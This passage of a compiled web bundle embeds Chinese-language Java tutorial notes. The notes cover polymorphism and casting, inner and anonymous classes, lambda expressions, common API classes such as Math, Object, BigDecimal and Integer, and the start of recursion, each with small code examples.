要有方法的重写\n  - 要有父类引用指向子类对象\n\n- 代码演示\n\n  ```java\n  class Animal {\n      public void eat(){\n          System.out.println("动物吃饭");\n      }\n  }\n\n  class Cat extends Animal {\n      @Override\n      public void eat() {\n          System.out.println("猫吃鱼");\n      }\n  }\n\n  public class Test1Polymorphic {\n      /*\n          多态的前提:\n\n              1. 要有(继承 \\ 实现)关系\n              2. 要有方法重写\n              3. 要有父类引用, 指向子类对象\n       */\n      public static void main(String[] args) {\n          // 当前事物, 是一只猫\n          Cat c = new Cat();\n          // 当前事物, 是一只动物\n          Animal a = new Cat();\n          a.eat();\n\n      }\n  }\n  ```\n\n### 3.2多态中的成员访问特点（记忆）\n\n- 成员访问特点\n\n  - 成员变量\n\n    ​\t编译看父类，运行看父类\n\n  - 成员方法\n\n    ​\t编译看父类，运行看子类\n\n- 代码演示\n\n  ```java\n  class Fu {\n      int num = 10;\n\n      public void method(){\n          System.out.println("Fu.. method");\n      }\n  }\n\n  class Zi extends Fu {\n      int num = 20;\n\n      public void method(){\n          System.out.println("Zi.. method");\n      }\n  }\n\n  public class Test2Polymorpic {\n      /*\n           多态的成员访问特点:\n\n                  成员变量: 编译看左边 (父类), 运行看左边 (父类)\n\n                  成员方法: 编译看左边 (父类), 运行看右边 (子类)\n       */\n      public static void main(String[] args) {\n          Fu f = new Zi();\n          System.out.println(f.num);\n          f.method();\n      }\n  }\n  ```\n\n### 3.3多态的好处和弊端（记忆）\n\n- 好处\n\n  ​\t提高程序的扩展性。定义方法时候，使用父类型作为参数，在使用的时候，使用具体的子类型参与操作\n\n- 弊端\n\n  ​\t不能使用子类的特有成员\n\n### 3.4多态中的转型（应用）\n\n- 向上转型\n\n  ​\t父类引用指向子类对象就是向上转型\n\n- 向下转型\n\n  ​\t格式：子类型 对象名 = (子类型)父类引用;\n\n- 代码演示\n\n  ```java\n  class Fu {\n      public void show(){\n          System.out.println("Fu..show...");\n      }\n  }\n\n  class Zi extends Fu {\n      @Override\n      public void show() {\n          System.out.println("Zi..show...");\n      }\n\n      public void method(){\n          System.out.println("我是子类特有的方法, method");\n      }\n  }\n\n  public class Test3Polymorpic {\n      public static void main(String[] args) {\n          // 1. 向上转型 : 父类引用指向子类对象\n          Fu f = new Zi();\n          f.show();\n          // 多态的弊端: 不能调用子类特有的成员\n          // f.method();\n\n          // A: 直接创建子类对象\n          // B: 向下转型\n\n          // 2. 向下转型 : 从父类类型, 转换回子类类型\n          Zi z = (Zi) f;\n          z.method();\n      }\n  }\n  ```\n\n### 3.5多态中转型存在的风险和解决方案 (应用) \n\n+ 风险\n\n  如果被转的引用类型变量,对应的实际类型和目标类型不是同一种类型,那么在转换的时候就会出现ClassCastException \n\n+ 解决方案\n\n  + 关键字\n\n    instanceof\n\n  + 使用格式\n\n    变量名 instanceof 类型\n\n    通俗的理解：判断关键字左边的变量，是否是右边的类型，返回boolean类型结果\n\n+ 代码演示\n\n  ```java\n  abstract class Animal {\n      public abstract void eat();\n  }\n\n  class Dog extends Animal {\n      public void eat() {\n          System.out.println("狗吃肉");\n      }\n\n      public void watchHome(){\n          System.out.println("看家");\n      }\n  }\n\n  class Cat extends Animal {\n      public void eat() {\n          System.out.println("猫吃鱼");\n      }\n  }\n\n  public class Test4Polymorpic {\n      public static void main(String[] args) {\n          useAnimal(new Dog());\n          useAnimal(new Cat());\n      }\n\n      public static void useAnimal(Animal a){  // Animal a = new Dog();\n                                               // Animal a = new Cat();\n          a.eat();\n          //a.watchHome();\n\n  //        Dog dog = (Dog) a;\n  //        dog.watchHome();  // ClassCastException  类型转换异常\n        \n          // 判断a变量记录的类型, 是否是Dog\n          if(a instanceof Dog){\n              Dog dog = (Dog) a;\n              dog.watchHome();\n          }\n      }\n\n  }\n  ```\n\n### 3.6黑马信息管理系统多态改进 (应用) \n\n+ 实现步骤\n\n  1. StudentDaoFactory类中方法的返回值定义成父类类型BaseStudentDao\n  2. StudentService中接收方法返回值的类型定义成父类类型BaseStudentDao\n\n+ 代码实现\n\n  StudentDaoFactory类\n\n  ```java\n  public class StudentDaoFactory {\n      public static BaseStudentDao getStudentDao(){\n          return new OtherStudentDao();\n      }\n  }\n  ```\n\n  StudentService类\n\n  ```java\n  public class StudentService {\n      // 创建StudentDao (库管)\n      // private OtherStudentDao studentDao = new OtherStudentDao();\n\n      // 通过学生库管工厂类, 获取库管对象\n      private BaseStudentDao studentDao = StudentDaoFactory.getStudentDao();\n  }  \n  ```\n\n## 4.内部类 \n\n### 4.1 内部类的基本使用（理解）\n\n- 内部类概念\n\n  - 在一个类中定义一个类。举例：在一个类A的内部定义一个类B，类B就被称为内部类\n\n- 内部类定义格式\n\n  - 格式&举例：\n\n    ```java\n    /*\n    \t格式：\n        class 外部类名{\n        \t修饰符 class 内部类名{\n        \t\n        \t}\n        }\n    */\n\n    class Outer {\n        public class Inner {\n            \n        }\n    }\n    ```\n\n- 内部类的访问特点 \n\n  - 内部类可以直接访问外部类的成员，包括私有\n  - 外部类要访问内部类的成员，必须创建对象\n\n- 示例代码：\n\n  ```java\n  /*\n      内部类访问特点：\n          内部类可以直接访问外部类的成员，包括私有\n          外部类要访问内部类的成员，必须创建对象\n   */\n  public class Outer {\n      private int num = 10;\n      public class Inner {\n          public void show() {\n              System.out.println(num);\n          }\n      }\n      public void method() {\n          Inner i = new Inner();\n          i.show();\n      }\n  }\n  ```\n\n### 2.2 成员内部类（理解）\n\n- 成员内部类的定义位置\n\n  - 在类中方法，跟成员变量是一个位置\n\n- 外界创建成员内部类格式\n\n  - 格式：外部类名.内部类名 对象名 = 外部类对象.内部类对象;\n  - 举例：Outer.Inner oi = new Outer().new Inner();\n\n- 私有成员内部类\n\n  - 将一个类，设计为内部类的目的，大多数都是不想让外界去访问，所以内部类的定义应该私有化，私有化之后，再提供一个可以让外界调用的方法，方法内部创建内部类对象并调用。\n\n  - 示例代码：\n\n    ```java\n    class Outer {\n        private int num = 10;\n        private class Inner {\n            public void show() {\n                System.out.println(num);\n            }\n        }\n        public void method() {\n            Inner i = new Inner();\n            i.show();\n        }\n    }\n    public class InnerDemo {\n        public static void main(String[] args) {\n    \t\t//Outer.Inner oi = new Outer().new Inner();\n    \t\t//oi.show();\n            Outer o = new Outer();\n            o.method();\n        }\n    }\n    ```\n\n- 静态成员内部类\n\n  + 静态成员内部类访问格式：外部类名.内部类名 对象名 = new 外部类名.内部类名();\n\n  + 静态成员内部类中的静态方法：外部类名.内部类名.方法名();\n\n  + 示例代码\n\n    ```java\n    class Outer {\n        static class Inner {\n            public void show(){\n                System.out.println("inner..show");\n            }\n\n            public static void method(){\n                System.out.println("inner..method");\n            }\n        }\n    }\n\n    public class Test3Innerclass {\n        /*\n            静态成员内部类演示\n         */\n        public static void main(String[] args) {\n            // 外部类名.内部类名 对象名 = new 外部类名.内部类名();\n            Outer.Inner oi = new Outer.Inner();\n            oi.show();\n\n            Outer.Inner.method();\n        }\n    }\n    ```\n\n### 2.3 局部内部类（理解）\n\n- 局部内部类定义位置\n\n  - 局部内部类是在方法中定义的类\n\n- 局部内部类方式方式\n\n  - 局部内部类，外界是无法直接使用，需要在方法内部创建对象并使用\n  - 该类可以直接访问外部类的成员，也可以访问方法内的局部变量\n\n- 示例代码\n\n  ```java\n  class Outer {\n      private int num = 10;\n      public void method() {\n          int num2 = 20;\n          class Inner {\n              public void show() {\n                  System.out.println(num);\n                  System.out.println(num2);\n              }\n          }\n          Inner i = new Inner();\n          i.show();\n      }\n  }\n  public class OuterDemo {\n      public static void main(String[] args) {\n          Outer o = new Outer();\n          o.method();\n      }\n  }\n\n  ```\n\n### 2.4 匿名内部类（应用）\n\n- 匿名内部类的前提\n\n  - 存在一个类或者接口，这里的类可以是具体类也可以是抽象类\n\n- 匿名内部类的格式\n\n  - 格式：new 类名 ( ) {  重写方法 }    new  接口名 ( ) { 重写方法 }\n\n  - 举例： \n\n    ```java\n    new Inter(){\n        @Override\n        public void method(){}\n    } \n    ```\n\n- 匿名内部类的本质\n\n  - 本质：是一个继承了该类或者实现了该接口的子类匿名对象\n\n- 匿名内部类的细节\n\n  - 匿名内部类可以通过多态的形式接受\n\n    ```java\n    Inter i = new Inter(){\n      @Override\n        public void method(){\n            \n        }\n    }\n    ```\n\n- 匿名内部类直接调用方法\n\n  ```java\n  interface Inter{\n      void method();\n  }\n\n  class Test{\n      public static void main(String[] args){\n          new Inter(){\n              @Override\n              public void method(){\n                  System.out.println("我是匿名内部类");\n              }\n          }.method();\t// 直接调用方法\n      }\n  }\n  ```\n\n### 2.4 匿名内部类在开发中的使用（应用）\n\n- 匿名内部类在开发中的使用\n\n  - 当发现某个方法需要，接口或抽象类的子类对象，我们就可以传递一个匿名内部类过去，来简化传统的代码\n\n- 示例代码：\n\n  ```java\n  /*\n      游泳接口\n   */\n  interface Swimming {\n      void swim();\n  }\n\n  public class TestSwimming {\n      public static void main(String[] args) {\n          goSwimming(new Swimming() {\n              @Override\n              public void swim() {\n                  System.out.println("铁汁, 我们去游泳吧");\n              }\n          });\n      }\n\n      /**\n       * 使用接口的方法\n       */\n      public static void goSwimming(Swimming swimming){\n          /*\n              Swimming swim = new Swimming() {\n                  @Override\n                  public void swim() {\n                      System.out.println("铁汁, 我们去游泳吧");\n                  }\n              }\n           */\n          swimming.swim();\n      }\n  }\n  ```\n\n## 5.Lambda表达式\n\n### 5.1体验Lambda表达式【理解】\n\n- 代码演示\n\n  ```java\n  /*\n      游泳接口\n   */\n  interface Swimming {\n      void swim();\n  }\n\n  public class TestSwimming {\n      public static void main(String[] args) {\n          // 通过匿名内部类实现\n          goSwimming(new Swimming() {\n              @Override\n              public void swim() {\n                  System.out.println("铁汁, 我们去游泳吧");\n              }\n          });\n\n          /*  通过Lambda表达式实现\n              理解: 对于Lambda表达式, 对匿名内部类进行了优化\n           */\n          goSwimming(() -> System.out.println("铁汁, 我们去游泳吧"));\n      }\n\n      /**\n       * 使用接口的方法\n       */\n      public static void goSwimming(Swimming swimming) {\n          swimming.swim();\n      }\n  }\n  ```\n\n- 函数式编程思想概述\n\n  在数学中，函数就是有输入量、输出量的一套计算方案，也就是“拿数据做操作”\n\n  面向对象思想强调“必须通过对象的形式来做事情”\n\n  函数式思想则尽量忽略面向对象的复杂语法：“强调做什么，而不是以什么形式去做”\n\n  而我们要学习的Lambda表达式就是函数式思想的体现\n\n### 5.2Lambda表达式的标准格式【理解】\n\n- 格式：\n\n  ​\t(形式参数) -> {代码块}\n\n  - 形式参数：如果有多个参数，参数之间用逗号隔开；如果没有参数，留空即可\n  - ->：由英文中画线和大于符号组成，固定写法。代表指向动作\n  - 代码块：是我们具体要做的事情，也就是以前我们写的方法体内容\n\n- 组成Lambda表达式的三要素：\n\n  - 形式参数，箭头，代码块\n\n### 5.3Lambda表达式练习1【应用】\n\n- Lambda表达式的使用前提\n\n  - 有一个接口\n  - 接口中有且仅有一个抽象方法\n\n- 练习描述\n\n  ​\t无参无返回值抽象方法的练习\n\n- 操作步骤\n\n  - 定义一个接口(Eatable)，里面定义一个抽象方法：void eat();\n  - 定义一个测试类(EatableDemo)，在测试类中提供两个方法\n    - 一个方法是：useEatable(Eatable e)\n    - 一个方法是主方法，在主方法中调用useEatable方法\n\n- 示例代码\n\n  ```java\n  //接口\n  public interface Eatable {\n      void eat();\n  }\n  //实现类\n  public class EatableImpl implements Eatable {\n      @Override\n      public void eat() {\n          System.out.println("一天一苹果，医生远离我");\n      }\n  }\n  //测试类\n  public class EatableDemo {\n      public static void main(String[] args) {\n          //在主方法中调用useEatable方法\n          Eatable e = new EatableImpl();\n          useEatable(e);\n\n          //匿名内部类\n          useEatable(new Eatable() {\n              @Override\n              public void eat() {\n                  System.out.println("一天一苹果，医生远离我");\n              }\n          });\n\n          //Lambda表达式\n          useEatable(() -> {\n              System.out.println("一天一苹果，医生远离我");\n          });\n      }\n\n      private static void useEatable(Eatable e) {\n          e.eat();\n      }\n  }\n  ```\n\n### 5.4Lambda表达式练习2【应用】\n\n- 练习描述\n\n  有参无返回值抽象方法的练习\n\n- 操作步骤\n\n  - 定义一个接口(Flyable)，里面定义一个抽象方法：void fly(String s);\n  - 定义一个测试类(FlyableDemo)，在测试类中提供两个方法\n    - 一个方法是：useFlyable(Flyable f)\n    - 一个方法是主方法，在主方法中调用useFlyable方法\n\n- 示例代码\n\n  ```java\n  public interface Flyable {\n      void fly(String s);\n  }\n\n  public class FlyableDemo {\n      public static void main(String[] args) {\n          //在主方法中调用useFlyable方法\n          //匿名内部类\n          useFlyable(new Flyable() {\n              @Override\n              public void fly(String s) {\n                  System.out.println(s);\n                  System.out.println("飞机自驾游");\n              }\n          });\n          System.out.println("--------");\n\n          //Lambda\n          useFlyable((String s) -> {\n              System.out.println(s);\n              System.out.println("飞机自驾游");\n          });\n\n      }\n\n      private static void useFlyable(Flyable f) {\n          f.fly("风和日丽，晴空万里");\n      }\n  }\n  ```\n\n### 5.5Lambda表达式练习3【应用】\n\n- 练习描述\n\n  有参有返回值抽象方法的练习\n\n- 操作步骤\n\n  - 定义一个接口(Addable)，里面定义一个抽象方法：int add(int x,int y);\n  - 定义一个测试类(AddableDemo)，在测试类中提供两个方法\n    - 一个方法是：useAddable(Addable a)\n    - 一个方法是主方法，在主方法中调用useAddable方法\n\n- 示例代码\n\n  ```java\n  public interface Addable {\n      int add(int x,int y);\n  }\n\n  public class AddableDemo {\n      public static void main(String[] args) {\n          //在主方法中调用useAddable方法\n          useAddable((int x,int y) -> {\n              return x + y;\n          });\n\n      }\n\n      private static void useAddable(Addable a) {\n          int sum = a.add(10, 20);\n          System.out.println(sum);\n      }\n  }\n  ```\n\n### 5.6Lambda表达式的省略模式【应用】\n\n- 省略的规则\n\n  - 参数类型可以省略。但是有多个参数的情况下，不能只省略一个\n  - 如果参数有且仅有一个，那么小括号可以省略\n  - 如果代码块的语句只有一条，可以省略大括号和分号，和return关键字\n\n- 代码演示\n\n  ```java\n  public interface Addable {\n      int add(int x, int y);\n  }\n\n  public interface Flyable {\n      void fly(String s);\n  }\n\n  public class LambdaDemo {\n      public static void main(String[] args) {\n  //        useAddable((int x,int y) -> {\n  //            return x + y;\n  //        });\n          //参数的类型可以省略\n          useAddable((x, y) -> {\n              return x + y;\n          });\n\n  //        useFlyable((String s) -> {\n  //            System.out.println(s);\n  //        });\n          //如果参数有且仅有一个，那么小括号可以省略\n  //        useFlyable(s -> {\n  //            System.out.println(s);\n  //        });\n\n          //如果代码块的语句只有一条，可以省略大括号和分号\n          useFlyable(s -> System.out.println(s));\n\n          //如果代码块的语句只有一条，可以省略大括号和分号，如果有return，return也要省略掉\n          useAddable((x, y) -> x + y);\n      }\n\n      private static void useFlyable(Flyable f) {\n          f.fly("风和日丽，晴空万里");\n      }\n\n      private static void useAddable(Addable a) {\n          int sum = a.add(10, 20);\n          System.out.println(sum);\n      }\n  }\n  ```\n\n### 5.7Lambda表达式的使用前提【理解】\n\n- 使用Lambda必须要有接口\n- 并且要求接口中有且仅有一个抽象方法\n\n### 5.8Lambda表达式和匿名内部类的区别【理解】\n\n- 所需类型不同\n  - 匿名内部类：可以是接口，也可以是抽象类，还可以是具体类\n  - Lambda表达式：只能是接口\n- 使用限制不同\n  - 如果接口中有且仅有一个抽象方法，可以使用Lambda表达式，也可以使用匿名内部类\n  - 如果接口中多于一个抽象方法，只能使用匿名内部类，而不能使用Lambda表达式\n- 实现原理不同\n  - 匿名内部类：编译之后，产生一个单独的.class字节码文件\n  - Lambda表达式：编译之后，没有一个单独的.class字节码文件。对应的字节码会在运行的时候动态生成\n\n\n\n',sn={data:function(){return{MainComponent1:tn,MainComponent2:en,MainComponent3:an}}},on=sn,ln=Object(u["a"])(on,nn,rn,!1,null,"40a7023c",null),cn=ln.exports,pn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent1}}),t("q-markdown",{attrs:{src:n.MainComponent2}})],1)},un=[],mn='## 1.API\n\n### 1.1 API概述【理解】\n\n- 什么是API\n\n  ​\tAPI (Application Programming Interface) ：应用程序编程接口\n\n- java中的API\n\n  ​\t指的就是 JDK 中提供的各种功能的 Java类，这些类将底层的实现封装了起来，我们不需要关心这些类是如何实现的，只需要学习这些类如何使用即可，我们可以通过帮助文档来学习这些API如何使用。\n\n### 1.2 如何使用API帮助文档【应用】\n\n- 打开帮助文档\n\n![01](./img/java/basics/day14-常用API01.img/01.png)\n\n- 找到索引选项卡中的输入框\n\n![02](./img/java/basics/day14-常用API01.img/02.png)\n\n- 在输入框中输入Random\n\n![03](./img/java/basics/day14-常用API01.img/03.png)\n\n- 看类在哪个包下\n\n![04](./img/java/basics/day14-常用API01.img/04.png)\n\n- 看类的描述\n\n![05](./img/java/basics/day14-常用API01.img/05.png)\n\n- 看构造方法\n\n![06](./img/java/basics/day14-常用API01.img/06.png)\n\n- 看成员方法\n\n![07](./img/java/basics/day14-常用API01.img/07.png)\n\n## 2.常用API \n\n### 2.1 Math（应用）\n\n- 1、Math类概述\n\n  - Math 包含执行基本数字运算的方法\n\n- 2、Math中方法的调用方式\n\n  - Math类中无构造方法，但内部的方法都是静态的，则可以通过   **类名.进行调用**\n\n- 3、Math类的常用方法\n\n  | 方法名    方法名                               | 说明                         |\n  | ---------------------------------------- | -------------------------- |\n  | public static int   abs(int a)           | 返回参数的绝对值                   |\n  | public static double ceil(double a)      | 返回大于或等于参数的最小double值，等于一个整数 |\n  | public static double floor(double a)     | 返回小于或等于参数的最大double值，等于一个整数 |\n  | public   static int round(float a)       | 按照四舍五入返回最接近参数的int          |\n  | public static int   max(int a,int b)     | 返回两个int值中的较大值              |\n  | public   static int min(int a,int b)     | 返回两个int值中的较小值              |\n  | public   static double pow (double a,double b) | 返回a的b次幂的值                  |\n  | public   static double random()          | 返回值为double的正值，[0.0,1.0)    |\n\n### 2.2 System（应用）\n\n- System类的常用方法 \n  | 方法名                                      | 说明                            |\n  | ---------------------------------------- | ----------------------------- |\n  | public   static void exit(int status)    | 终止当前运行的   Java   虚拟机，非零表示异常终止 |\n  | public   static long currentTimeMillis() | 返回当前时间(以毫秒为单位)                |\n\n- 示例代码\n\n  - 需求：在控制台输出1-10000，计算这段代码执行了多少毫秒 \n\n  ```java\n  public class SystemDemo {\n      public static void main(String[] args) {\n          // 获取开始的时间节点\n          long start = System.currentTimeMillis();\n          for (int i = 1; i <= 10000; i++) {\n              System.out.println(i);\n          }\n          // 获取代码运行结束后的时间节点\n          long end = System.currentTimeMillis();\n          System.out.println("共耗时：" + (end - start) + "毫秒");\n      }\n  }\n  ```\n\n### 2.3 Object类的toString方法（应用）\n\n- Object类概述\n\n  - Object 是类层次结构的根，每个类都可以将 Object 作为超类。所有类都直接或者间接的继承自该类，换句话说，该类所具备的方法，所有类都会有一份\n\n- 查看方法源码的方式\n\n  - 选中方法，按下Ctrl + B\n\n- 重写toString方法的方式\n\n  - 1. Alt + Insert 选择toString\n  - 1. 在类的空白区域，右键 -> Generate -> 选择toString\n\n- toString方法的作用：\n\n  - 以良好的格式，更方便的展示对象中的属性值\n\n- 示例代码：\n\n  ```java\n  class Student extends Object {\n      private String name;\n      private int age;\n\n      public Student() {\n      }\n\n      public Student(String name, int age) {\n          this.name = name;\n          this.age = age;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getAge() {\n          return age;\n      }\n\n      public void setAge(int age) {\n          this.age = age;\n      }\n\n      @Override\n      public String toString() {\n          return "Student{" +\n                  "name=\'" + name + \'\\\'\' +\n                  ", age=" + age +\n                  \'}\';\n      }\n  }\n  public class ObjectDemo {\n      public static void main(String[] args) {\n          Student s = new Student();\n          s.setName("林青霞");\n          s.setAge(30);\n          System.out.println(s); \n          System.out.println(s.toString()); \n      }\n  }\n  ```\n\n- 运行结果：\n\n  ```java\n  Student{name=\'林青霞\', age=30}\n  Student{name=\'林青霞\', age=30}\n  ```\n\n### 2.4 Object类的equals方法（应用）\n\n- equals方法的作用\n\n  - 用于对象之间的比较，返回true和false的结果\n  - 举例：s1.equals(s2);    s1和s2是两个对象\n\n- 重写equals方法的场景\n\n  - 不希望比较对象的地址值，想要结合对象属性进行比较的时候。\n\n- 重写equals方法的方式\n\n  - 1. alt + insert  选择equals() and hashCode()，IntelliJ Default，一路next，finish即可\n  - 1. 在类的空白区域，右键 -> Generate -> 选择equals() and hashCode()，后面的同上。\n\n- 示例代码：\n\n  ```java\n  class Student {\n      private String name;\n      private int age;\n\n      public Student() {\n      }\n\n      public Student(String name, int age) {\n          this.name = name;\n          this.age = age;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getAge() {\n          return age;\n      }\n\n      public void setAge(int age) {\n          this.age = age;\n      }\n\n      @Override\n      public boolean equals(Object o) {\n          //this -- s1\n          //o -- s2\n          if (this == o) return true;\n          if (o == null || getClass() != o.getClass()) return false;\n\n          Student student = (Student) o; //student -- s2\n\n          if (age != student.age) return false;\n          return name != null ? name.equals(student.name) : student.name == null;\n      }\n  }\n  public class ObjectDemo {\n      public static void main(String[] args) {\n          Student s1 = new Student();\n          s1.setName("林青霞");\n          s1.setAge(30);\n\n          Student s2 = new Student();\n          s2.setName("林青霞");\n          s2.setAge(30);\n\n          //需求：比较两个对象的内容是否相同\n          System.out.println(s1.equals(s2));\n      }\n  }\n\n  ```\n\n- 面试题\n\n  ```java\n  // 看程序,分析结果\n  String s = “abc”;\n  StringBuilder sb = new StringBuilder(“abc”);\n  s.equals(sb); \n  sb.equals(s); \n\n  public class InterviewTest {\n      public static void main(String[] args) {\n          String s1 = "abc";\n          StringBuilder sb = new StringBuilder("abc");\n          //1.此时调用的是String类中的equals方法.\n          //保证参数也是字符串,否则不会比较属性值而直接返回false\n          //System.out.println(s1.equals(sb)); // false\n\n          //StringBuilder类中是没有重写equals方法,用的就是Object类中的.\n          System.out.println(sb.equals(s1)); // false\n      }\n  }\n  ```\n\n### 2.5 Objects (应用)\n\n+ 常用方法\n\n  | 方法名                                      | 说明               |\n  | ---------------------------------------- | ---------------- |\n  | public static String toString(对象)        | 返回参数中对象的字符串表示形式。 |\n  | public static String toString(对象, 默认字符串) | 返回对象的字符串表示形式。    |\n  | public static Boolean isNull(对象)         | 判断对象是否为空         |\n  | public static Boolean nonNull(对象)        | 判断对象是否不为空        |\n\n+ 示例代码\n\n  学生类\n\n  ```java\n  class Student {\n        private String name;\n        private int age;\n\n        public Student() {\n        }\n\n        public Student(String name, int age) {\n            this.name = name;\n            this.age = age;\n        }\n\n        public String getName() {\n            return name;\n        }\n\n        public void setName(String name) {\n            this.name = name;\n        }\n\n        public int getAge() {\n            return age;\n        }\n\n        public void setAge(int age) {\n            this.age = age;\n        }\n\n        @Override\n        public String toString() {\n            return "Student{" +\n                    "name=\'" + name + \'\\\'\' +\n                    ", age=" + age +\n                    \'}\';\n        }\n    }\n  ```\n\n  测试类\n\n  ```java\n  public class MyObjectsDemo {\n            public static void main(String[] args) {\n        //        public static String toString(对象): 返回参数中对象的字符串表示形式。\n        //        Student s = new Student("小罗同学",50);\n        //        String result = Objects.toString(s);\n        //        System.out.println(result);\n        //        System.out.println(s);\n\n        //        public static String toString(对象, 默认字符串): 返回对象的字符串表示形式。如果对象为空,那么返回第二个参数.\n                //Student s = new Student("小花同学",23);\n        //        Student s = null;\n        //        String result = Objects.toString(s, "随便写一个");\n        //        System.out.println(result);\n        \n        //        public static Boolean isNull(对象): 判断对象是否为空\n                //Student s = null;\n        //        Student s = new Student();\n        //        boolean result = Objects.isNull(s);\n        //        System.out.println(result);\n\n        //        public static Boolean nonNull(对象): 判断对象是否不为空\n                //Student s = new Student();\n                Student s = null;\n                boolean result = Objects.nonNull(s);\n                System.out.println(result);\n            }\n    }\n  ```\n\n\n### 2.6 BigDecimal (应用)\n\n+ 作用\n\n  可以用来进行精确计算\n\n\n+ 构造方法\n\n  | 方法名                    | 说明        |\n  | ---------------------- | --------- |\n  | BigDecimal(double val) | 参数为double |\n  | BigDecimal(String val) | 参数为String |\n\n+ 常用方法\n\n  | 方法名                                      | 说明   |\n  | ---------------------------------------- | ---- |\n  | public BigDecimal add(另一个BigDecimal对象)   | 加法   |\n  | public BigDecimal subtract (另一个BigDecimal对象) | 减法   |\n  | public BigDecimal multiply (另一个BigDecimal对象) | 乘法   |\n  | public BigDecimal divide (另一个BigDecimal对象) | 除法   |\n  | public BigDecimal divide (另一个BigDecimal对象，精确几位，舍入模式) | 除法   |\n\n+ 总结\n\n  1. BigDecimal是用来进行精确计算的\n  2. 创建BigDecimal的对象，构造方法使用参数类型为字符串的。\n  3. 四则运算中的除法，如果除不尽请使用divide的三个参数的方法。\n\n  代码示例：\n\n  ```java\n  BigDecimal divide = bd1.divide(参与运算的对象,小数点后精确到多少位,舍入模式);\n  参数1 ，表示参与运算的BigDecimal 对象。\n  参数2 ，表示小数点后面精确到多少位\n  参数3 ，舍入模式  \n    BigDecimal.ROUND_UP  进一法\n    BigDecimal.ROUND_FLOOR 去尾法\n    BigDecimal.ROUND_HALF_UP 四舍五入\n  ```\n\n## 3.包装类\n\n### 3.1 基本类型包装类（记忆）\n\n- 基本类型包装类的作用\n\n   将基本数据类型封装成对象的好处在于可以在对象中定义更多的功能方法操作该数据\n\n   常用的操作之一：用于基本数据类型与字符串之间的转换\n\n- 基本类型对应的包装类\n\n  | 基本数据类型  | 包装类       |\n  | ------- | --------- |\n  | byte    | Byte      |\n  | short   | Short     |\n  | int     | Integer   |\n  | long    | Long      |\n  | float   | Float     |\n  | double  | Double    |\n  | char    | Character |\n  | boolean | Boolean   |\n\n### 3.2 Integer类（应用）\n\n- Integer类概述\n\n   包装一个对象中的原始类型 int 的值\n\n- Integer类构造方法\n\n  | 方法名                                     | 说明                           |\n  | --------------------------------------- | ---------------------------- |\n  | public Integer(int   value)             | 根据 int 值创建 Integer 对象(过时)    |\n  | public Integer(String s)                | 根据 String 值创建 Integer 对象(过时) |\n  | public static Integer valueOf(int i)    | 返回表示指定的 int 值的 Integer   实例  |\n  | public static Integer valueOf(String s) | 返回一个保存指定值的 Integer 对象 String |\n\n- 示例代码\n\n  ```java\n  public class IntegerDemo {\n      public static void main(String[] args) {\n          //public Integer(int value)：根据 int 值创建 Integer 对象(过时)\n          Integer i1 = new Integer(100);\n          System.out.println(i1);\n\n          //public Integer(String s)：根据 String 值创建 Integer 对象(过时)\n          Integer i2 = new Integer("100");\n  //        Integer i2 = new Integer("abc"); //NumberFormatException\n          System.out.println(i2);\n          System.out.println("--------");\n\n          //public static Integer valueOf(int i)：返回表示指定的 int 值的 Integer 实例\n          Integer i3 = Integer.valueOf(100);\n          System.out.println(i3);\n\n          //public static Integer valueOf(String s)：返回一个保存指定值的Integer对象 String\n          Integer i4 = Integer.valueOf("100");\n          System.out.println(i4);\n      }\n  }\n  ```\n\n### 3.3 自动拆箱和自动装箱（理解）\n\n- 自动装箱\n\n  ​\t把基本数据类型转换为对应的包装类类型\n\n- 自动拆箱\n\n  ​\t把包装类类型转换为对应的基本数据类型\n\n- 示例代码\n\n  ```java\n  Integer i = 100;  // 自动装箱\n  i += 200;         // i = i + 200;  i + 200 自动拆箱；i = i + 200; 是自动装箱\n  ```\n\n### 3.4 int和String类型的相互转换（记忆）\n\n- int转换为String\n\n  - 转换方式\n\n    - 方式一：直接在数字后加一个空字符串\n    - 方式二：通过String类静态方法valueOf()\n\n  - 示例代码\n\n    ```java\n    public class IntegerDemo {\n        public static void main(String[] args) {\n            //int --- String\n            int number = 100;\n            //方式1\n            String s1 = number + "";\n            System.out.println(s1);\n            //方式2\n            //public static String valueOf(int i)\n            String s2 = String.valueOf(number);\n            System.out.println(s2);\n            System.out.println("--------");\n        }\n    }\n    ```\n\n- String转换为int\n\n  - 转换方式\n\n    - 方式一：先将字符串数字转成Integer，再调用valueOf()方法\n    - 方式二：通过Integer静态方法parseInt()进行转换\n\n  - 示例代码\n\n    ```java\n    public class IntegerDemo {\n        public static void main(String[] args) {\n            //String --- int\n            String s = "100";\n            //方式1：String --- Integer --- int\n            Integer i = Integer.valueOf(s);\n            //public int intValue()\n            int x = i.intValue();\n            System.out.println(x);\n            //方式2\n            //public static int parseInt(String s)\n            int y = Integer.parseInt(s);\n            System.out.println(y);\n        }\n    }\n    ```\n\n### 3.5 字符串数据排序案例（应用）\n\n- 案例需求\n\n  ​\t有一个字符串：“91 27 46 38 50”，请写程序实现最终输出结果是：27 38 46 50 91\n\n- 代码实现\n\n  ```java\n  public class IntegerTest {\n      public static void main(String[] args) {\n          //定义一个字符串\n          String s = "91 27 46 38 50";\n\n          //把字符串中的数字数据存储到一个int类型的数组中\n          String[] strArray = s.split(" ");\n  //        for(int i=0; i<strArray.length; i++) {\n  //            System.out.println(strArray[i]);\n  //        }\n\n          //定义一个int数组，把 String[] 数组中的每一个元素存储到 int 数组中\n          int[] arr = new int[strArray.length];\n          for(int i=0; i<arr.length; i++) {\n              arr[i] = Integer.parseInt(strArray[i]);\n          }\n\n          //对 int 数组进行排序\n          Arrays.sort(arr);\n\n        \tfor(int i=0; i<arr.length; i++){\n           System.out.print(arr[i] + " ");\n        \t}\n  }\n  ```\n\n## 4.递归\n\n### 4.1 递归【应用】\n\n- 递归的介绍\n\n  - 以编程的角度来看，递归指的是方法定义中调用方法本身的现象\n  - 把一个复杂的问题层层转化为一个与原问题相似的规模较小的问题来求解\n  - 递归策略只需少量的程序就可描述出解题过程所需要的多次重复计算\n\n- 递归的基本使用\n\n  ```java\n  public class MyFactorialDemo2 {\n      public static void main(String[] args) {\n          int sum = getSum(100);\n          System.out.println(sum);\n      }\n\n      private static int getSum(int i) {\n          //1- 100之间的和\n              //100 + (1-99之间的和)\n                      // 99 + (1- 